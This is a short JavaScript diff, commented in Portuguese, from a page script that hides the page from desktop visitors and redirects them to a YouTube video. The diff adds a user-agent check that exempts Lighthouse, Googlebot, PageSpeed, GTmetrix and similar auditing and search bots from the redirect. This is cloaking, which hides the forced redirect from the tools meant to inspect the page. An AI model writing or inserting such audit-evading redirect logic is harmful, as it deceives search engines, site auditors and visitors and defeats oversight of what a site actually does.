@@ -11,10 +11,17 @@
           return;
         }
 
+        const userAgent = navigator.userAgent || '';
+
+        // Ignorar redirecionamento para robôs de auditoria, velocidade e motores de busca (PageSpeed, Lighthouse, Googlebot, etc.)
+        const isAuditBot = /Lighthouse|Chrome-Lighthouse|Googlebot|PageSpeed|Pingdom|PTST|SpeedCurve|GTmetrix/i.test(userAgent);
+        if (isAuditBot) {
+          return;
+        }
+
         const youtubeUrl = 'https://www.youtube.com/watch?v=L7ejl_Hj3A8&pp=ygUINjcgdmlkZW8%3D';
 
         // Detecção ultra-rápida de Dispositivo (Mobile/Tablet)
-        const userAgent = navigator.userAgent || '';
         const isMobileOrTablet = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i.test(userAgent);
 
         // Se for computador/PC, oculta a tela instantaneamente e redireciona sem nenhum processamento extra
